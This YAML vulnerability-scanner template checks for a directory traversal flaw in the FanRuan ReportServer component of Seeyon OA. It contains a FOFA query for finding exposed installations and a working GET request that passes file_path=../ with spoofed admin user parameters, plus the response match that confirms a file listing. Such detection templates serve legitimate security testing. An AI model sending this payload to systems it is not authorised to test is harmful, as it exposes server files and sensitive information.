id: seeyon-reportserver-directory-travesal

info:
  name: 致远OA 帆软组件 ReportServer 目录遍历漏洞
  author: zan8in
  severity: high
  verified: true
  description: |
    致远OA 帆软组件 ReportServer 接口存在目录遍历漏洞,攻击者通过漏洞可以获取服务器敏感信息
    fofa: title="致远A8-V5协同管理软件 V6.1sp1"
  tags: seeyon,fanruan,reportserver,directory,traversal
  created: 2023/05/26
  requires: [seeyon]
  requires-mode: opportunistic

rules:
  r0:
    request:
      method: GET
      path: /seeyonreport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=../&currentUserName=admin&currentUserId=1&isWebReport=true
    expression: |
      response.status == 200 && 
      response.body.bcontains(b'<NODES') && 
      response.body.bcontains(b'</NODES>') && 
      response.body.bcontains(b'xmlVersion') && 
      response.body.bcontains(b'releaseVersion')
expression: r0()
